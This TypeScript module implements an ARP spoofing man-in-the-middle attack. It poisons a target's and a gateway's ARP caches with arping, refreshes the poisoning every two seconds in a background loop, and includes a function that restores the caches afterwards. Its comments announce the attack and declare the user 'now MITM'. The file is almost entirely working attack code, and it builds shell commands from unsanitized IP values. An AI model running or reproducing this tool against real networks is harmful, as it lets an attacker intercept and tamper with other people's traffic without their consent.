import { exec } from './exec';

export interface ArpSpoof {
  targetIp: string;
  gatewayIp: string;
  interface: string;
  targetMac?: string;
  gatewayMac?: string;
}

/**
 * Get MAC address for IP
 */
export async function getMacAddress(ip: string): Promise<string> {
  try {
    // Ping first to populate ARP cache
    await exec(`ping -c 1 -W 1 ${ip}`, { ignoreError: true });
    
    // Get MAC from ARP table
    const { stdout } = await exec(`ip neigh show ${ip} | awk '{print $5}'`);
    const mac = stdout.trim();
    
    if (!mac || mac === '') {
      throw new Error(`Could not find MAC address for ${ip}`);
    }
    
    return mac;
  } catch (error) {
    throw new Error(`Failed to get MAC for ${ip}: ${error}`);
  }
}

/**
 * Start ARP spoofing attack
 * This makes your machine a man-in-the-middle
 */
export async function startArpSpoof(config: ArpSpoof): Promise<void> {
  const { targetIp, gatewayIp, interface: iface } = config;
  
  console.log('  Starting ARP spoofing...');
  
  try {
    // Get MAC addresses if not provided
    const targetMac = config.targetMac || await getMacAddress(targetIp);
    const gatewayMac = config.gatewayMac || await getMacAddress(gatewayIp);
    
    console.log(`  Target MAC: ${targetMac}`);
    console.log(`  Gateway MAC: ${gatewayMac}`);
    
    // Spoof target: Tell target that WE are the gateway
    await exec(
      `arp -s ${gatewayIp} $(cat /sys/class/net/${iface}/address) -i ${iface}`
    );
    
    // Send gratuitous ARP to target
    // This tells target: "Hey, gateway's MAC is now MY MAC"
    await exec(
      `arping -c 3 -A -I ${iface} -s ${gatewayIp} ${targetIp} 2>/dev/null`,
      { ignoreError: true }
    );
    
    // Spoof gateway: Tell gateway that WE are the target
    await exec(
      `arp -s ${targetIp} $(cat /sys/class/net/${iface}/address) -i ${iface}`
    );
    
    // Send gratuitous ARP to gateway
    await exec(
      `arping -c 3 -A -I ${iface} -s ${targetIp} ${gatewayIp} 2>/dev/null`,
      { ignoreError: true }
    );
    
    console.log('  ✓ ARP spoofing active - you are now MITM');
    
    // Keep ARP spoofing alive in background
    startArpSpoofDaemon(targetIp, gatewayIp, iface);
    
  } catch (error) {
    throw new Error(`ARP spoofing failed: ${error}`);
  }
}

/**
 * Start background daemon to keep ARP spoofing active
 */
function startArpSpoofDaemon(targetIp: string, gatewayIp: string, iface: string): void {
  // Send ARP packets every 2 seconds to maintain spoofing
  const interval = setInterval(async () => {
    try {
      // Refresh target
      await exec(
        `arping -c 1 -A -I ${iface} -s ${gatewayIp} ${targetIp} 2>/dev/null`,
        { ignoreError: true }
      );
      
      // Refresh gateway
      await exec(
        `arping -c 1 -A -I ${iface} -s ${targetIp} ${gatewayIp} 2>/dev/null`,
        { ignoreError: true }
      );
    } catch {
      // Ignore errors
    }
  }, 2000);
  
  // Store interval ID globally so we can clear it later
  (global as any).__arpSpoofInterval = interval;
}

/**
 * Stop ARP spoofing and restore normal ARP cache
 */
export async function stopArpSpoof(targetIp: string, gatewayIp: string, iface: string): Promise<void> {
  try {
    console.log('  Stopping ARP spoofing...');
    
    // Clear background daemon
    if ((global as any).__arpSpoofInterval) {
      clearInterval((global as any).__arpSpoofInterval);
      (global as any).__arpSpoofInterval = null;
    }
    
    // Get real MAC addresses
    const targetMac = await getMacAddress(targetIp);
    const gatewayMac = await getMacAddress(gatewayIp);
    
    // Restore target's ARP cache
    await exec(
      `arping -c 5 -A -I ${iface} -s ${gatewayIp} -S ${gatewayMac} ${targetIp} 2>/dev/null`,
      { ignoreError: true }
    );
    
    // Restore gateway's ARP cache
    await exec(
      `arping -c 5 -A -I ${iface} -s ${targetIp} -S ${targetMac} ${gatewayIp} 2>/dev/null`,
      { ignoreError: true }
    );
    
    // Delete static ARP entries
    await exec(`arp -d ${targetIp}`, { ignoreError: true });
    await exec(`arp -d ${gatewayIp}`, { ignoreError: true });
    
    console.log('  ✓ ARP spoofing stopped - normal routing restored');
    
  } catch (error) {
    console.error('  Warning: ARP restore failed:', error);
  }
}

/**
 * Check if arping is available
 */
export async function checkArpingAvailable(): Promise<boolean> {
  try {
    await exec('which arping');
    return true;
  } catch {
    return false;
  }
}